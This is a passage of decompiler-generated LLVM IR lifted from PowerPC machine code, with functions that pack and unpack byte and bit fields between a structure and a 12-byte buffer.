  uselistorder i32 %v0_1000c118, { 2, 3, 0, 1 }
  uselistorder i32 %v1_1000c0b8, { 1, 0 }
  uselistorder i32 %v2_1000c0b0, { 1, 0 }
  uselistorder i32 %v0_1000c0a8, { 1, 0, 2 }
  uselistorder i32 %v1_1000c090, { 1, 0 }
  uselistorder i32 %v2_1000c06c, { 2, 0, 3, 1, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 0, 5, 1, 2, 3, 6, 4, 7, 8, 9, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i1* %cr7_lt.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 1, 2, 11, 3, 4, 5, 6, 7, 8, 19, 9, 10, 17, 12, 18, 14, 13, 15, 16 }
  uselistorder i32 97, { 1, 2, 4, 5, 3, 0 }
  uselistorder i32 (i32, i8*)* @function_10006eb8, { 0, 1, 4, 5, 6, 7, 2, 3, 8, 9 }
  uselistorder i32* @r1, { 2, 4, 3, 1, 5, 0, 6, 10, 11, 7, 8, 9, 12 }
  uselistorder i1 true, { 3, 0, 4, 5, 1, 2 }
  uselistorder i8 58, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 65535, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10006e28, { 15, 14, 9, 2, 8, 7, 4, 0, 1, 3, 13, 12, 11, 10, 6, 5 }
  uselistorder i32 (i32, i32, i32)* @function_1000bec8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_1000c2b4, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1000c29c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c264, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c238, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000c214, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1000c16c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c160, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c144, { 1, 0 }
  uselistorder label %dec_label_pc_1000c124, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c120, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0d8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c090, { 1, 0 }
}

define i32 @function_1000c2cc(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c2cc:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 -1, i32* %r7.global-to-local, align 4
  %tmp2 = icmp slt i32 %arg3, 12
  br i1 %tmp2, label %dec_label_pc_1000c3b0, label %dec_label_pc_1000c2d8

dec_label_pc_1000c2d8:                            ; preds = %dec_label_pc_1000c2cc
  %tmp3 = inttoptr i32 %arg2 to i8*
  %v1_1000c2d8 = add i32 %tmp, 2
  %v2_1000c2d8 = inttoptr i32 %v1_1000c2d8 to i8*
  %v3_1000c2d8 = load i8, i8* %v2_1000c2d8, align 1
  %v4_1000c2d8 = zext i8 %v3_1000c2d8 to i32
  store i32 %v4_1000c2d8, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r7.global-to-local, align 4
  store i8 %v3_1000c2d8, i8* %tmp3, align 1
  %v2_1000c2e4 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c2e4, i32* %r0.global-to-local, align 4
  %v1_1000c2e8 = trunc i32 %v2_1000c2e4 to i8
  %v4_1000c2e8 = add i32 %arg2, 1
  %v5_1000c2e8 = inttoptr i32 %v4_1000c2e8 to i8*
  store i8 %v1_1000c2e8, i8* %v5_1000c2e8, align 1
  %v1_1000c2ec = add i32 %tmp, 12
  %v2_1000c2ec = inttoptr i32 %v1_1000c2ec to i32*
  %v3_1000c2ec = load i32, i32* %v2_1000c2ec, align 4
  store i32 %v3_1000c2ec, i32* %r0.global-to-local, align 4
  %v1_1000c2f0 = add i32 %tmp, 16
  %v2_1000c2f0 = inttoptr i32 %v1_1000c2f0 to i32*
  %v3_1000c2f0 = load i32, i32* %v2_1000c2f0, align 4
  store i32 %v3_1000c2f0, i32* %r11.global-to-local, align 4
  %v1_1000c2f4 = add i32 %tmp, 4
  %v2_1000c2f4 = inttoptr i32 %v1_1000c2f4 to i32*
  %v3_1000c2f4 = load i32, i32* %v2_1000c2f4, align 4
  %v2_1000c2f8 = icmp ne i32 %v3_1000c2ec, 0
  %v5_1000c2fc = zext i1 %v2_1000c2f8 to i32
  store i32 %v5_1000c2fc, i32* %r10.global-to-local, align 4
  %v1_1000c300 = add i32 %tmp, 8
  %v2_1000c300 = inttoptr i32 %v1_1000c300 to i32*
  %v3_1000c300 = load i32, i32* %v2_1000c300, align 4
  %v2_1000c304 = icmp ne i32 %v3_1000c2f0, 0
  %v5_1000c308 = zext i1 %v2_1000c304 to i32
  %v1_1000c30c = add i32 %tmp, 20
  %v2_1000c30c = inttoptr i32 %v1_1000c30c to i32*
  %v3_1000c30c = load i32, i32* %v2_1000c30c, align 4
  store i32 %v3_1000c30c, i32* %r0.global-to-local, align 4
  %not.v2_1000c310 = icmp eq i32 %v3_1000c2f4, 0
  %v6_1000c314 = sext i1 %not.v2_1000c310 to i32
  store i32 %v5_1000c308, i32* %r11.global-to-local, align 4
  %v1_1000c31c = call i32 @__asm_rlwinm(i32 %v6_1000c314, i32 0, i32 24, i32 24)
  %v0_1000c320 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c320 = mul i32 %v0_1000c320, 4
  store i32 %v1_1000c320, i32* %r10.global-to-local, align 4
  %v1_1000c324 = call i32 @__asm_rlwinm(i32 %v3_1000c300, i32 3, i32 25, i32 28)
  %v0_1000c328 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000c328 = icmp ne i32 %v0_1000c328, 0
  %v5_1000c32c = zext i1 %v2_1000c328 to i32
  %v2_1000c330 = or i32 %v1_1000c320, %v1_1000c324
  store i32 %v2_1000c330, i32* %r10.global-to-local, align 4
  %v1_1000c334 = add i32 %v1_1000c31c, 128
  %v0_1000c338 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c338 = mul i32 %v0_1000c338, 2
  store i32 %v1_1000c338, i32* %r11.global-to-local, align 4
  %v2_1000c33c = or i32 %v2_1000c330, %v5_1000c32c
  store i32 %v2_1000c33c, i32* %r0.global-to-local, align 4
  %v2_1000c340 = or i32 %v2_1000c33c, %v1_1000c334
  %v2_1000c344 = or i32 %v2_1000c340, %v1_1000c338
  %v1_1000c348 = trunc i32 %v2_1000c344 to i8
  %v4_1000c348 = add i32 %arg2, 2
  %v5_1000c348 = inttoptr i32 %v4_1000c348 to i8*
  store i8 %v1_1000c348, i8* %v5_1000c348, align 1
  %v1_1000c34c = add i32 %tmp, 24
  %v2_1000c34c = inttoptr i32 %v1_1000c34c to i32*
  %v3_1000c34c = load i32, i32* %v2_1000c34c, align 4
  %v1_1000c350 = add i32 %tmp, 28
  %v2_1000c350 = inttoptr i32 %v1_1000c350 to i32*
  %v3_1000c350 = load i32, i32* %v2_1000c350, align 4
  store i32 %v3_1000c350, i32* %r0.global-to-local, align 4
  %not.v2_1000c354 = icmp eq i32 %v3_1000c34c, 0
  %v6_1000c358 = sext i1 %not.v2_1000c354 to i32
  %v1_1000c35c = call i32 @__asm_rlwinm(i32 %v6_1000c358, i32 0, i32 24, i32 24)
  %v1_1000c360 = urem i32 %v3_1000c350, 16
  store i32 %v1_1000c360, i32* %r0.global-to-local, align 4
  %v1_1000c364 = add i32 %v1_1000c35c, 128
  %v2_1000c368 = or i32 %v1_1000c360, %v1_1000c364
  %v1_1000c36c = trunc i32 %v2_1000c368 to i8
  %v4_1000c36c = add i32 %arg2, 3
  %v5_1000c36c = inttoptr i32 %v4_1000c36c to i8*
  store i8 %v1_1000c36c, i8* %v5_1000c36c, align 1
  %v1_1000c370 = add i32 %tmp, 34
  %v2_1000c370 = inttoptr i32 %v1_1000c370 to i8*
  %v3_1000c370 = load i8, i8* %v2_1000c370, align 1
  %v4_1000c370 = zext i8 %v3_1000c370 to i32
  store i32 %v4_1000c370, i32* %r0.global-to-local, align 4
  %v4_1000c374 = add i32 %arg2, 4
  %v5_1000c374 = inttoptr i32 %v4_1000c374 to i8*
  store i8 %v3_1000c370, i8* %v5_1000c374, align 1
  %v1_1000c378 = add i32 %tmp, 32
  %v2_1000c378 = inttoptr i32 %v1_1000c378 to i32*
  %v3_1000c378 = load i32, i32* %v2_1000c378, align 4
  store i32 %v3_1000c378, i32* %r0.global-to-local, align 4
  %v1_1000c37c = trunc i32 %v3_1000c378 to i8
  %v4_1000c37c = add i32 %arg2, 5
  %v5_1000c37c = inttoptr i32 %v4_1000c37c to i8*
  store i8 %v1_1000c37c, i8* %v5_1000c37c, align 1
  %v1_1000c380 = add i32 %tmp, 38
  %v2_1000c380 = inttoptr i32 %v1_1000c380 to i8*
  %v3_1000c380 = load i8, i8* %v2_1000c380, align 1
  %v4_1000c380 = zext i8 %v3_1000c380 to i32
  store i32 %v4_1000c380, i32* %r0.global-to-local, align 4
  %v4_1000c384 = add i32 %arg2, 6
  %v5_1000c384 = inttoptr i32 %v4_1000c384 to i8*
  store i8 %v3_1000c380, i8* %v5_1000c384, align 1
  %v1_1000c388 = add i32 %tmp, 36
  %v2_1000c388 = inttoptr i32 %v1_1000c388 to i32*
  %v3_1000c388 = load i32, i32* %v2_1000c388, align 4
  store i32 %v3_1000c388, i32* %r0.global-to-local, align 4
  %v1_1000c38c = trunc i32 %v3_1000c388 to i8
  %v4_1000c38c = add i32 %arg2, 7
  %v5_1000c38c = inttoptr i32 %v4_1000c38c to i8*
  store i8 %v1_1000c38c, i8* %v5_1000c38c, align 1
  %v1_1000c390 = add i32 %tmp, 42
  %v2_1000c390 = inttoptr i32 %v1_1000c390 to i8*
  %v3_1000c390 = load i8, i8* %v2_1000c390, align 1
  %v4_1000c390 = zext i8 %v3_1000c390 to i32
  store i32 %v4_1000c390, i32* %r0.global-to-local, align 4
  %v4_1000c394 = add i32 %arg2, 8
  %v5_1000c394 = inttoptr i32 %v4_1000c394 to i8*
  store i8 %v3_1000c390, i8* %v5_1000c394, align 1
  %v1_1000c398 = add i32 %tmp, 40
  %v2_1000c398 = inttoptr i32 %v1_1000c398 to i32*
  %v3_1000c398 = load i32, i32* %v2_1000c398, align 4
  store i32 %v3_1000c398, i32* %r0.global-to-local, align 4
  %v1_1000c39c = trunc i32 %v3_1000c398 to i8
  %v4_1000c39c = add i32 %arg2, 9
  %v5_1000c39c = inttoptr i32 %v4_1000c39c to i8*
  store i8 %v1_1000c39c, i8* %v5_1000c39c, align 1
  %v1_1000c3a0 = add i32 %tmp, 46
  %v2_1000c3a0 = inttoptr i32 %v1_1000c3a0 to i8*
  %v3_1000c3a0 = load i8, i8* %v2_1000c3a0, align 1
  %v4_1000c3a0 = zext i8 %v3_1000c3a0 to i32
  store i32 %v4_1000c3a0, i32* %r0.global-to-local, align 4
  %v4_1000c3a4 = add i32 %arg2, 10
  %v5_1000c3a4 = inttoptr i32 %v4_1000c3a4 to i8*
  store i8 %v3_1000c3a0, i8* %v5_1000c3a4, align 1
  %v1_1000c3a8 = add i32 %tmp, 44
  %v2_1000c3a8 = inttoptr i32 %v1_1000c3a8 to i32*
  %v3_1000c3a8 = load i32, i32* %v2_1000c3a8, align 4
  store i32 %v3_1000c3a8, i32* %r0.global-to-local, align 4
  %v1_1000c3ac = trunc i32 %v3_1000c3a8 to i8
  %v4_1000c3ac = add i32 %arg2, 11
  %v5_1000c3ac = inttoptr i32 %v4_1000c3ac to i8*
  store i8 %v1_1000c3ac, i8* %v5_1000c3ac, align 1
  %v0_1000c3b0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000c3b0

dec_label_pc_1000c3b0:                            ; preds = %dec_label_pc_1000c2cc, %dec_label_pc_1000c2d8
  %v0_1000c3b0 = phi i32 [ -1, %dec_label_pc_1000c2cc ], [ %v0_1000c3b0.pre, %dec_label_pc_1000c2d8 ]
  ret i32 %v0_1000c3b0

; uselistorder directives
  uselistorder i32 %v1_1000c360, { 1, 0 }
  uselistorder i32 %v1_1000c338, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder label %dec_label_pc_1000c3b0, { 1, 0 }
}

define i32 @function_1000c3b8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c3b8:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1000c3b8 = load i8, i8* %arg1, align 1
  %v4_1000c3b8 = zext i8 %v3_1000c3b8 to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_1000c3c0 = add i32 %tmp, 1
  %v3_1000c3c0 = inttoptr i32 %v2_1000c3c0 to i8*
  %v4_1000c3c0 = load i8, i8* %v3_1000c3c0, align 1
  %v5_1000c3c0 = zext i8 %v4_1000c3c0 to i32
  %v1_1000c3c8 = mul nuw nsw i32 %v4_1000c3b8, 256
  %v2_1000c3cc = or i32 %v5_1000c3c0, %v1_1000c3c8
  %v2_1000c3d0 = inttoptr i32 %arg2 to i32*
  store i32 %v2_1000c3cc, i32* %v2_1000c3d0, align 4
  %v0_1000c3d4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3d4 = add i32 %v0_1000c3d4, 2
  %v2_1000c3d4 = inttoptr i32 %v1_1000c3d4 to i8*
  %v3_1000c3d4 = load i8, i8* %v2_1000c3d4, align 1
  %v4_1000c3d4 = zext i8 %v3_1000c3d4 to i32
  %v1_1000c3d8 = call i32 @__asm_rlwinm(i32 %v4_1000c3d4, i32 25, i32 31, i32 31)
  %v2_1000c3dc = add i32 %arg2, 4
  %v3_1000c3dc = inttoptr i32 %v2_1000c3dc to i32*
  store i32 %v1_1000c3d8, i32* %v3_1000c3dc, align 4
  %v0_1000c3e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3e0 = add i32 %v0_1000c3e0, 2
  %v2_1000c3e0 = inttoptr i32 %v1_1000c3e0 to i8*
  %v3_1000c3e0 = load i8, i8* %v2_1000c3e0, align 1
  %v4_1000c3e0 = zext i8 %v3_1000c3e0 to i32
  %v1_1000c3e4 = call i32 @__asm_rlwinm(i32 %v4_1000c3e0, i32 29, i32 28, i32 31)
  %v2_1000c3e8 = add i32 %arg2, 8
  %v3_1000c3e8 = inttoptr i32 %v2_1000c3e8 to i32*
  store i32 %v1_1000c3e4, i32* %v3_1000c3e8, align 4
  %v0_1000c3ec = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3ec = add i32 %v0_1000c3ec, 2
  %v2_1000c3ec = inttoptr i32 %v1_1000c3ec to i8*
  %v3_1000c3ec = load i8, i8* %v2_1000c3ec, align 1
  %v4_1000c3ec = zext i8 %v3_1000c3ec to i32
  %v1_1000c3f0 = call i32 @__asm_rlwinm(i32 %v4_1000c3ec, i32 30, i32 31, i32 31)
  %v2_1000c3f4 = add i32 %arg2, 12
  %v3_1000c3f4 = inttoptr i32 %v2_1000c3f4 to i32*
  store i32 %v1_1000c3f0, i32* %v3_1000c3f4, align 4
  %v0_1000c3f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c3f8 = add i32 %v0_1000c3f8, 2
  %v2_1000c3f8 = inttoptr i32 %v1_1000c3f8 to i8*
  %v3_1000c3f8 = load i8, i8* %v2_1000c3f8, align 1
  %v4_1000c3f8 = zext i8 %v3_1000c3f8 to i32
  %v1_1000c3fc = call i32 @__asm_rlwinm(i32 %v4_1000c3f8, i32 31, i32 31, i32 31)
  %v2_1000c400 = add i32 %arg2, 16
  %v3_1000c400 = inttoptr i32 %v2_1000c400 to i32*
  store i32 %v1_1000c3fc, i32* %v3_1000c400, align 4
  %v0_1000c404 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c404 = add i32 %v0_1000c404, 2
  %v2_1000c404 = inttoptr i32 %v1_1000c404 to i8*
  %v3_1000c404 = load i8, i8* %v2_1000c404, align 1
  %tmp1 = urem i8 %v3_1000c404, 2
  %v1_1000c408 = zext i8 %tmp1 to i32
  %v2_1000c40c = add i32 %arg2, 20
  %v3_1000c40c = inttoptr i32 %v2_1000c40c to i32*
  store i32 %v1_1000c408, i32* %v3_1000c40c, align 4
  %v0_1000c410 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c410 = add i32 %v0_1000c410, 3
  %v2_1000c410 = inttoptr i32 %v1_1000c410 to i8*
  %v3_1000c410 = load i8, i8* %v2_1000c410, align 1
  %v4_1000c410 = zext i8 %v3_1000c410 to i32
  %v1_1000c414 = call i32 @__asm_rlwinm(i32 %v4_1000c410, i32 25, i32 31, i32 31)
  %v2_1000c418 = add i32 %arg2, 24
  %v3_1000c418 = inttoptr i32 %v2_1000c418 to i32*
  store i32 %v1_1000c414, i32* %v3_1000c418, align 4
  %v0_1000c41c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c41c = add i32 %v0_1000c41c, 3
  %v2_1000c41c = inttoptr i32 %v1_1000c41c to i8*
  %v3_1000c41c = load i8, i8* %v2_1000c41c, align 1
  %tmp2 = urem i8 %v3_1000c41c, 16
  %v1_1000c420 = zext i8 %tmp2 to i32
  %v2_1000c424 = add i32 %arg2, 28
  %v3_1000c424 = inttoptr i32 %v2_1000c424 to i32*
  store i32 %v1_1000c420, i32* %v3_1000c424, align 4
  %v0_1000c428 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c428 = add i32 %v0_1000c428, 4
  %v2_1000c428 = inttoptr i32 %v1_1000c428 to i8*
  %v3_1000c428 = load i8, i8* %v2_1000c428, align 1
  %v4_1000c428 = zext i8 %v3_1000c428 to i32
  %v1_1000c42c = add i32 %v0_1000c428, 5
  %v2_1000c42c = inttoptr i32 %v1_1000c42c to i8*
  %v3_1000c42c = load i8, i8* %v2_1000c42c, align 1
  %v4_1000c42c = zext i8 %v3_1000c42c to i32
  %v1_1000c430 = mul nuw nsw i32 %v4_1000c428, 256
  %v2_1000c434 = or i32 %v4_1000c42c, %v1_1000c430
  %v2_1000c438 = add i32 %arg2, 32
  %v3_1000c438 = inttoptr i32 %v2_1000c438 to i32*
  store i32 %v2_1000c434, i32* %v3_1000c438, align 4
  %v0_1000c43c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c43c = add i32 %v0_1000c43c, 6
  %v2_1000c43c = inttoptr i32 %v1_1000c43c to i8*
  %v3_1000c43c = load i8, i8* %v2_1000c43c, align 1
  %v4_1000c43c = zext i8 %v3_1000c43c to i32
  %v1_1000c440 = add i32 %v0_1000c43c, 7
  %v2_1000c440 = inttoptr i32 %v1_1000c440 to i8*
  %v3_1000c440 = load i8, i8* %v2_1000c440, align 1
  %v4_1000c440 = zext i8 %v3_1000c440 to i32
  %v1_1000c444 = mul nuw nsw i32 %v4_1000c43c, 256
  %v2_1000c448 = or i32 %v4_1000c440, %v1_1000c444
  %v2_1000c44c = add i32 %arg2, 36
  %v3_1000c44c = inttoptr i32 %v2_1000c44c to i32*
  store i32 %v2_1000c448, i32* %v3_1000c44c, align 4
  %v0_1000c450 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c450 = add i32 %v0_1000c450, 8
  %v2_1000c450 = inttoptr i32 %v1_1000c450 to i8*
  %v3_1000c450 = load i8, i8* %v2_1000c450, align 1
  %v4_1000c450 = zext i8 %v3_1000c450 to i32
  %v1_1000c454 = add i32 %v0_1000c450, 9
  %v2_1000c454 = inttoptr i32 %v1_1000c454 to i8*
  %v3_1000c454 = load i8, i8* %v2_1000c454, align 1
  %v4_1000c454 = zext i8 %v3_1000c454 to i32
  %v1_1000c458 = mul nuw nsw i32 %v4_1000c450, 256
  %v2_1000c45c = or i32 %v4_1000c454, %v1_1000c458
  %v2_1000c460 = add i32 %arg2, 40
  %v3_1000c460 = inttoptr i32 %v2_1000c460 to i32*
  store i32 %v2_1000c45c, i32* %v3_1000c460, align 4
  %v0_1000c464 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c464 = add i32 %v0_1000c464, 10
  %v2_1000c464 = inttoptr i32 %v1_1000c464 to i8*
  %v3_1000c464 = load i8, i8* %v2_1000c464, align 1
  %v4_1000c464 = zext i8 %v3_1000c464 to i32
  %v1_1000c468 = add i32 %v0_1000c464, 11
  %v2_1000c468 = inttoptr i32 %v1_1000c468 to i8*
  %v3_1000c468 = load i8, i8* %v2_1000c468, align 1
  %v4_1000c468 = zext i8 %v3_1000c468 to i32
  store i32 %v4_1000c468, i32* %r9.global-to-local, align 4
  %v1_1000c46c = mul nuw nsw i32 %v4_1000c464, 256
  %v2_1000c470 = or i32 %v4_1000c468, %v1_1000c46c
  %v2_1000c474 = add i32 %arg2, 44
  %v3_1000c474 = inttoptr i32 %v2_1000c474 to i32*
  store i32 %v2_1000c470, i32* %v3_1000c474, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 1, 2, 6, 7, 8, 5, 3, 0, 4 }
  uselistorder i32 11, { 7, 8, 10, 9, 3, 11, 0, 1, 12, 13, 14, 15, 16, 2, 4, 5, 6 }
  uselistorder i32 40, { 4, 5, 8, 6, 7, 0, 9, 10, 11, 12, 13, 3, 2, 1 }
  uselistorder i32 7, { 8, 9, 11, 12, 13, 14, 1, 2, 3, 4, 5, 6, 7, 10, 0 }
  uselistorder i32 5, { 18, 19, 12, 13, 14, 4, 5, 15, 1, 16, 17, 3, 2, 20, 21, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 28, { 14, 15, 16, 17, 2, 3, 6, 27, 31, 43, 18, 0, 19, 20, 21, 4, 5, 32, 11, 13, 22, 28, 29, 23, 24, 33, 34, 35, 36, 37, 38, 41, 39, 40, 1, 42, 44, 30, 7, 8, 9, 10, 12, 25, 26 }
  uselistorder i32 29, { 6, 0, 1, 14, 15, 4, 5, 7, 8, 9, 10, 13, 11, 12, 18, 19, 16, 17, 2, 3 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @function_1000c47c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c47c:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_1000c498 = load i32, i32* %arg1, align 4
  store i32 %v2_1000c498, i32* %r3.global-to-local, align 4
  store i32 268485792, i32* @lr, align 4
  %v1_1000c49c = inttoptr i32 %v2_1000c498 to i8*
  %v2_1000c49c = call i32 @function_1000cbcc(i8* %v1_1000c49c)
  store i32 %v2_1000c49c, i32* %r3.global-to-local, align 4
  %v1_1000c4a0 = icmp slt i32 %v2_1000c49c, 0
  %v1_1000c4a4 = load i32, i32* @r29, align 4
  %v2_1000c4a4 = sub i32 %v1_1000c4a4, %v2_1000c49c
  store i32 %v2_1000c4a4, i32* @r29, align 4
  br i1 %v1_1000c4a0, label %dec_label_pc_1000c4e4, label %dec_label_pc_1000c4b0

dec_label_pc_1000c4b0:                            ; preds = %dec_label_pc_1000c47c
  %v2_1000c4a8 = icmp sgt i32 %v2_1000c4a4, 3
  %v0_1000c4b0 = load i32, i32* @r30, align 4
  %v2_1000c4b0 = add i32 %v0_1000c4b0, %v2_1000c49c
  store i32 %v2_1000c4b0, i32* %r9.global-to-local, align 4
  br i1 %v2_1000c4a8, label %dec_label_pc_1000c4c0, label %dec_label_pc_1000c4b8

dec_label_pc_1000c4b8:                            ; preds = %dec_label_pc_1000c4b0
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c4e4

dec_label_pc_1000c4c0:                            ; preds = %dec_label_pc_1000c4b0
  %v0_1000c4c0 = load i32, i32* @r31, align 4
  %v1_1000c4c0 = add i32 %v0_1000c4c0, 6
  %v2_1000c4c0 = inttoptr i32 %v1_1000c4c0 to i8*
  %v3_1000c4c0 = load i8, i8* %v2_1000c4c0, align 1
  %v5_1000c4c4 = inttoptr i32 %v2_1000c4b0 to i8*
  store i8 %v3_1000c4c0, i8* %v5_1000c4c4, align 1
  %v0_1000c4c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1000c4c8 = add i32 %v0_1000c4c8, 4
  store i32 %v1_1000c4c8, i32* %r3.global-to-local, align 4
  %v0_1000c4cc = load i32, i32* @r31, align 4
  %v1_1000c4cc = add i32 %v0_1000c4cc, 4
  %v2_1000c4cc = inttoptr i32 %v1_1000c4cc to i32*
  %v3_1000c4cc = load i32, i32* %v2_1000c4cc, align 4
  %v1_1000c4d0 = trunc i32 %v3_1000c4cc to i8
  %v2_1000c4d0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c4d0 = add i32 %v2_1000c4d0, 1
  %v4_1000c4d0 = inttoptr i32 %v3_1000c4d0 to i8*
  store i8 %v1_1000c4d0, i8* %v4_1000c4d0, align 1
  %v0_1000c4d4 = load i32, i32* @r31, align 4
  %v1_1000c4d4 = add i32 %v0_1000c4d4, 10
  %v2_1000c4d4 = inttoptr i32 %v1_1000c4d4 to i8*
  %v3_1000c4d4 = load i8, i8* %v2_1000c4d4, align 1
  %v2_1000c4d8 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c4d8 = add i32 %v2_1000c4d8, 2
  %v4_1000c4d8 = inttoptr i32 %v3_1000c4d8 to i8*
  store i8 %v3_1000c4d4, i8* %v4_1000c4d8, align 1
  %v0_1000c4dc = load i32, i32* @r31, align 4
  %v1_1000c4dc = add i32 %v0_1000c4dc, 8
  %v2_1000c4dc = inttoptr i32 %v1_1000c4dc to i32*
  %v3_1000c4dc = load i32, i32* %v2_1000c4dc, align 4
  %v1_1000c4e0 = trunc i32 %v3_1000c4dc to i8
  %v2_1000c4e0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000c4e0 = add i32 %v2_1000c4e0, 3
  %v4_1000c4e0 = inttoptr i32 %v3_1000c4e0 to i8*
  store i8 %v1_1000c4e0, i8* %v4_1000c4e0, align 1
  %v0_1000c4f4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000c4e4

dec_label_pc_1000c4e4:                            ; preds = %dec_label_pc_1000c47c, %dec_label_pc_1000c4b8, %dec_label_pc_1000c4c0
  %v0_1000c4f4 = phi i32 [ %v2_1000c49c, %dec_label_pc_1000c47c ], [ -1, %dec_label_pc_1000c4b8 ], [ %v0_1000c4f4.pre, %dec_label_pc_1000c4c0 ]
  ret i32 %v0_1000c4f4

; uselistorder directives
  uselistorder i32 %v2_1000c49c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_1000c4e4, { 2, 1, 0 }
}

define i32 @function_1000c4f8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c4f8:
  store i32 268485896, i32* @lr, align 4
  %v0_1000c504 = call i32 @function_1000cd8c()
  %v1_1000c508 = icmp slt i32 %v0_1000c504, 0
  br i1 %v1_1000c508, label %dec_label_pc_1000c514, label %dec_label_pc_1000c510

dec_label_pc_1000c510:                            ; preds = %dec_label_pc_1000c4f8
  %v1_1000c510 = add i32 %v0_1000c504, 4
  br label %dec_label_pc_1000c514

dec_label_pc_1000c514:                            ; preds = %dec_label_pc_1000c4f8, %dec_label_pc_1000c510
  %v0_1000c520 = phi i32 [ %v0_1000c504, %dec_label_pc_1000c4f8 ], [ %v1_1000c510, %dec_label_pc_1000c510 ]
  ret i32 %v0_1000c520

; uselistorder directives
  uselistorder label %dec_label_pc_1000c514, { 1, 0 }
}

define i32 @function_1000c524(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
dec_label_pc_1000c524:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1000c528 = load i32, i32* @lr, align 4
  store i32 %v0_1000c528, i32* %r0.global-to-local, align 4
  %v2_1000c530 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_1000c530, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268485972, i32* @lr, align 4
  %v2_1000c550 = call i32 @function_1000cc98(i32 %v2_1000c530, i32 256)
  store i32 %v2_1000c550, i32* @r27, align 4
  %v1_1000c554 = icmp slt i32 %v2_1000c550, 0
  %v0_1000c558 = load i32, i32* @r28, align 4
  %v2_1000c558 = add i32 %v0_1000c558, %v2_1000c550
  store i32 %v2_1000c558, i32* @r28, align 4
  %v1_1000c55c = load i32, i32* @r29, align 4
  %v2_1000c55c = sub i32 %v1_1000c55c, %v2_1000c558
  %v1_1000c560 = add i32 %v2_1000c55c, -10
